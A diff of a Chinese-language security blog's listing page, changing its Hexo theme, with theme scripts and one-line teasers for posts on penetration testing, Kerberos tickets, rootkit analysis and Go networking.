-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/binary/" rel="tag">binary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/binary/" style="font-size: 16.67px;">binary</a> <a href="/tags/bug-bounty/" style="font-size: 10px;">bug bounty</a> <a href="/tags/code/" style="font-size: 16.67px;">code</a> <a href="/tags/pentest/" style="font-size: 20px;">pentest</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/11/13/ret2dl/">ret2dl</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/11/bypass-Canary/">bypass Canary</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/24/ptmalloc/">ptmalloc机制闲扯</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/23/Double-free/">Double free</a>
-          </li>
-        
-          <li>
-            <a href="/2020/09/05/linux-fd/">linux中的pipe与fd</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 ph4ntom<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
-</html>
+<meta name="twitter:image" content="http://yoursite.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2020-11-25 18:56:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/bg1.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ph4ntom's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site-title">ph4ntom's blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/05/27/Steal-password-by-alias/" title="密码“水坑”">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码“水坑”"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/27/Steal-password-by-alias/" title="密码“水坑”">密码“水坑”</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-27T05:37:54.000Z" title="发表于 2020-05-27 13:37:54">2020-05-27</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:32:54.595Z" title="更新于 2020-11-25 18:32:54">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/pentest/">pentest</a></span></div><div class="content">我们在渗透的过程中，往往会遇到拿下了边界linux服务器的权限，但是由于得不到root的密码，内网也没有其他可控点，从而无法横向移动，故而我想记录一下一些小方法，如何给合法用户下“水坑”</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/04/17/rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" title="rootkit分析&amp;&amp;linux内核机制学习（一）">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="rootkit分析&amp;&amp;linux内核机制学习（一）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/17/rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" title="rootkit分析&amp;&amp;linux内核机制学习（一）">rootkit分析&amp;&amp;linux内核机制学习（一）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-17T08:02:43.000Z" title="发表于 2020-04-17 16:02:43">2020-04-17</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:38:34.491Z" title="更新于 2020-11-25 14:38:34">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/pentest/">pentest</a></span></div><div class="content">分析一个rootkit的源代码来分析其功能模块并籍此学习部分linux内核知识</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/03/17/Kerberos-gold-sliver-ticket/" title="Kerberos黄金白银票据">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kerberos黄金白银票据"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/17/Kerberos-gold-sliver-ticket/" title="Kerberos黄金白银票据">Kerberos黄金白银票据</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-17T06:22:25.000Z" title="发表于 2020-03-17 14:22:25">2020-03-17</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:36:59.517Z" title="更新于 2020-11-25 14:36:59">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/pentest/">pentest</a></span></div><div class="content">在分析了MS14-068漏洞之后，来讲讲域渗透中很重要的两个知识，Kerberos的黄金票据和白银票据</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/03/17/Kerberos/" title="Kerberos MS14-068">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kerberos MS14-068"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/17/Kerberos/" title="Kerberos MS14-068">Kerberos MS14-068</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-17T04:38:40.000Z" title="发表于 2020-03-17 12:38:40">2020-03-17</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:31:03.599Z" title="更新于 2020-11-25 18:31:03">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/pentest/">pentest</a></span></div><div class="content">最近想继续搞一下内网方面的东西，并且对各个经典的ntlm，kerberos漏洞进行一些分析和复现，仅以此记录</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/03/16/Port-reuse/" title="端口复用的一些tricks">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="端口复用的一些tricks"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/16/Port-reuse/" title="端口复用的一些tricks">端口复用的一些tricks</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-16T09:40:33.000Z" title="发表于 2020-03-16 17:40:33">2020-03-16</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:38:03.144Z" title="更新于 2020-11-25 14:38:03">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/code/">code</a></span></div><div class="content">最近在写自己的多级代理跳板工具时，本来想为其加入端口复用的功能，以期在高度受限的环境下仍然可以正常工作,但在实施的过程中我发现了一些值得记录的点</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/03/14/Go-source-code/" title="Go net/http包源码解析（一）">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go net/http包源码解析（一）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/14/Go-source-code/" title="Go net/http包源码解析（一）">Go net/http包源码解析（一）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-14T11:07:17.000Z" title="发表于 2020-03-14 19:07:17">2020-03-14</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:30:09.071Z" title="更新于 2020-11-25 18:30:09">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/code/">code</a></span></div><div class="content">net/http包是Go原生包中使用十分频繁的包，然而最近在写程序的时候发现了一些有意思的知识点，故想记录下来以防自己以后忘记。</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ph4ntom</div><div class="author-info__description">The wheel turns,nothing is ever new</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ph4ntonn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客～</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/11/13/ret2dl/" title="ret2dl"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2dl"/></a><div class="content"><a class="title" href="/2020/11/13/ret2dl/" title="ret2dl">ret2dl</a><time datetime="2020-11-13T03:45:20.000Z" title="发表于 2020-11-13 11:45:20">2020-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/11/bypass-Canary/" title="bypass Canary"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bypass Canary"/></a><div class="content"><a class="title" href="/2020/11/11/bypass-Canary/" title="bypass Canary">bypass Canary</a><time datetime="2020-11-11T10:19:56.000Z" title="发表于 2020-11-11 18:19:56">2020-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ptmalloc机制闲扯"/></a><div class="content"><a class="title" href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯">ptmalloc机制闲扯</a><time datetime="2020-10-24T13:40:30.000Z" title="发表于 2020-10-24 21:40:30">2020-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/10/23/Double-free/" title="Double free"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Double free"/></a><div class="content"><a class="title" href="/2020/10/23/Double-free/" title="Double free">Double free</a><time datetime="2020-10-23T11:08:20.000Z" title="发表于 2020-10-23 19:08:20">2020-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/09/05/linux-fd/" title="linux中的pipe与fd"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux中的pipe与fd"/></a><div class="content"><a class="title" href="/2020/09/05/linux-fd/" title="linux中的pipe与fd">linux中的pipe与fd</a><time datetime="2020-09-05T08:12:33.000Z" title="发表于 2020-09-05 16:12:33">2020-09-05</time></div></div></div></div></div><div class="card-widget card-categories"><div class="card-content"><div class="item-headline"><i class="fas fa-folder-open"></i><span>分类</span></div><ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">WEB安全</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">Web安全</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">二进制安全</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">渗透</span><span class="card-category-list-count">5</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/"><span class="card-category-list-name">编程</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/"><span class="card-category-list-name">赏金猎人</span><span class="card-category-list-count">1</span></a></li>
+            
+            </ul></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/binary/" style="font-size: 1.37em; color: #99a4b2">binary</a> <a href="/tags/bug-bounty/" style="font-size: 1.1em; color: #999">bug bounty</a> <a href="/tags/code/" style="font-size: 1.37em; color: #99a4b2">code</a> <a href="/tags/pentest/" style="font-size: 1.5em; color: #99a9bf">pentest</a> <a href="/tags/web/" style="font-size: 1.23em; color: #999ea6">web</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">十一月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/09/"><span class="card-archive-list-date">九月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">八月 2020</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/06/"><span class="card-archive-list-date">六月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/05/"><span class="card-archive-list-date">五月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/04/"><span class="card-archive-list-date">四月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/03/"><span class="card-archive-list-date">三月 2020</span><span class="card-archive-list-count">4</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">16</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">37.6k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2020-11-25T10:56:42.680Z"></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bg1.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By ph4ntom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function subtitleType () {
+  if (true) { 
+    var typed = new Typed("#subtitle", {
+      strings: "The wheel turns&#44;nothing is ever new".split(","),
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: false,
+      backSpeed: 50
+    })
+  } else {
+    document.getElementById("subtitle").innerHTML = 'The wheel turns&#44;nothing is ever new'
+  }
+}
+
+if (true) {
+  if (typeof Typed === 'function') subtitleType()
+  else $.getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js', subtitleType)
+} else {
+  subtitleType()
